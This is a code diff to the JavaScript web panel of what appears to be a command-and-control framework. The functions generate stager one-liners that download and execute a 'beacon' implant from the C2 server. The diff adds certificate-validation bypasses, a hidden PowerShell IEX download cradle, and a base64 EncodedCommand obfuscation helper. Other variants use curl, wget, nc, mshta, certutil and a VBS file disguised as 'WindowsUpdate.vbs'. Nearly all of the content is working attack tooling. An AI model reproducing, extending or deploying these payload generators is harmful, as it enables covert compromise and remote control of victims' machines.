@@ -2832,16 +2832,17 @@ function svShowOneliners(token) {
   // Reuse _stagerShowOneliners logic by temporarily pointing to sv-oneliner-list
   // We render directly into the panel
   const base = window.location.origin;
-  const url = `${base}/s/${token}`;
+  const url     = `${base}/s/${token}`;
   const hta_url = `${base}/s/${token}/hta`;
   const vbs_url = `${base}/s/${token}/vbs`;
+  const ps_url  = `${base}/s/${token}/ps`;
   const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
   const parsed = new URL(url);
   const ncHost = parsed.hostname;
   const ncPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
   const ncPath = parsed.pathname;
   const pyExec = (bin, u) =>
-    `${bin} -c "import urllib.request,builtins; c=urllib.request.urlopen('${u}').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
+    `${bin} -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('${u}',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
 
   const groups = [
     { title: '🐍 Python', items: [
@@ -2849,14 +2850,14 @@ function svShowOneliners(token) {
       { label: 'python  (Windows)',     cmd: pyExec('python',  url) },
     ]},
     { title: '🐚 Shell / Unix', items: [
-      { label: 'curl',          cmd: `curl -s "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
-      { label: 'wget',          cmd: `wget -qO /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
-      { label: 'sh (fallback)', cmd: `sh -c "curl -s '${url}' -o /tmp/s.py 2>/dev/null || wget -qO /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
+      { label: 'curl',          cmd: `curl -sk "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
+      { label: 'wget',          cmd: `wget -q --no-check-certificate -O /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
+      { label: 'sh (fallback)', cmd: `sh -c "curl -sk '${url}' -o /tmp/s.py 2>/dev/null || wget -q --no-check-certificate -O /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
       { label: 'nc (raw TCP)',  cmd: `(printf 'GET ${ncPath} HTTP/1.0\r\nHost: ${ncHost}\r\n\r\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys,builtins; b=sys.stdin.buffer.read(); c=b[b.find(bytes([13,10,13,10]))+4:]; exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
     ]},
     { title: '🪟 Windows', items: [
       { label: 'PowerShell — llama python',  cmd: pyExec('python', url) },
-      { label: 'PowerShell — URL ofuscada',  cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,builtins; c=urllib.request.urlopen('$u').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+      { label: 'PowerShell — URL ofuscada',  cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
       { label: 'mshta (HTA)',                cmd: `mshta ${hta_url}` },
       { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
       { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
@@ -2864,9 +2865,20 @@ function svShowOneliners(token) {
       { label: 'VBS — descarga (PowerShell)',cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
       { label: 'VBS — URL del archivo',      cmd: vbs_url },
     ]},
+    { title: '🔐 PowerShell AES', items: [
+      {
+        label: 'IEX (descarga y ejecuta PS stager)',
+        cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))"`
+      },
+      {
+        label: 'EncodedCommand (UTF-16LE base64)',
+        cmd: `powershell -nop -w hidden -EncodedCommand ${_toUtf16LeBase64(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))`)}`
+      },
+      { label: 'URL del script PS1', cmd: ps_url },
+    ]},
     { title: '🔧 Otros', items: [
-      { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
-      { label: 'Perl', cmd: `perl -e "system('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
+      { label: 'PHP',  cmd: `php -r "passthru('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
+      { label: 'Perl', cmd: `perl -e "system('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
     ]},
   ];
 
@@ -5821,11 +5833,21 @@ function _escHtml(s) {
   return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
+function _toUtf16LeBase64(str) {
+  const buf = new Uint8Array(str.length * 2);
+  for (let i = 0; i < str.length; i++) {
+    buf[i * 2]     = str.charCodeAt(i) & 0xff;
+    buf[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xff;
+  }
+  return btoa(String.fromCharCode(...buf));
+}
+
 function _stagerShowOneliners(token) {
   const base = window.location.origin;
-  const url = `${base}/s/${token}`;
-  const hta_url = `${base}/s/${token}/hta`;
-  const vbs_url = `${base}/s/${token}/vbs`;
+  const url      = `${base}/s/${token}`;
+  const hta_url  = `${base}/s/${token}/hta`;
+  const vbs_url  = `${base}/s/${token}/vbs`;
+  const ps_url   = `${base}/s/${token}/ps`;
 
   // PS obfuscation: encode URL as decimal char array (only the URL, injected via $u variable)
   const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
@@ -5837,8 +5859,9 @@ function _stagerShowOneliners(token) {
   const ncPath = parsed.pathname;
 
   // Python exec helper — passes __file__ and __builtins__ so the beacon works correctly
+  // SSL context bypasses self-signed cert verification on the C2 server
   const pyExec = (pyBin, u) =>
-    `${pyBin} -c "import urllib.request,builtins; c=urllib.request.urlopen('${u}').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
+    `${pyBin} -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('${u}',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
 
   const groups = [
     {
@@ -5851,9 +5874,9 @@ function _stagerShowOneliners(token) {
     {
       title: '🐚 Shell / Unix',
       items: [
-        { label: 'curl',         cmd: `curl -s "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
-        { label: 'wget',         cmd: `wget -qO /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
-        { label: 'sh (fallback)', cmd: `sh -c "curl -s '${url}' -o /tmp/s.py 2>/dev/null || wget -qO /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
+        { label: 'curl',         cmd: `curl -sk "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
+        { label: 'wget',         cmd: `wget -q --no-check-certificate -O /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
+        { label: 'sh (fallback)', cmd: `sh -c "curl -sk '${url}' -o /tmp/s.py 2>/dev/null || wget -q --no-check-certificate -O /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
         { label: 'nc (raw TCP)', cmd: `(printf 'GET ${ncPath} HTTP/1.0\r\nHost: ${ncHost}\r\n\r\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys,builtins; b=sys.stdin.buffer.read(); c=b[b.find(bytes([13,10,13,10]))+4:]; exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
       ]
     },
@@ -5861,7 +5884,7 @@ function _stagerShowOneliners(token) {
       title: '🪟 Windows',
       items: [
         { label: 'PowerShell — llama python', cmd: pyExec('python', url) },
-        { label: 'PowerShell — URL ofuscada', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,builtins; c=urllib.request.urlopen('$u').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+        { label: 'PowerShell — URL ofuscada', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,ssl,builtins; _c=ssl.create_default_context(); _c.check_hostname=False; _c.verify_mode=ssl.CERT_NONE; c=urllib.request.urlopen('$u',context=_c).read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
         { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
         { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
         { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
@@ -5871,10 +5894,24 @@ function _stagerShowOneliners(token) {
       ]
     },
     {
+      title: '🔐 PowerShell AES',
+      items: [
+        {
+          label: 'IEX (descarga y ejecuta PS stager)',
+          cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))"`
+        },
+        {
+          label: 'EncodedCommand (UTF-16LE base64)',
+          cmd: `powershell -nop -w hidden -EncodedCommand ${_toUtf16LeBase64(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((New-Object Net.WebClient).DownloadString('${ps_url}'))`)}`
+        },
+        { label: 'URL del script PS1', cmd: ps_url },
+      ]
+    },
+    {
       title: '🔧 Otros',
       items: [
-        { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
-        { label: 'Perl', cmd: `perl -e "system('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
+        { label: 'PHP',  cmd: `php -r "passthru('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
+        { label: 'Perl', cmd: `perl -e "system('curl -sk ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
       ]
     },
   ];
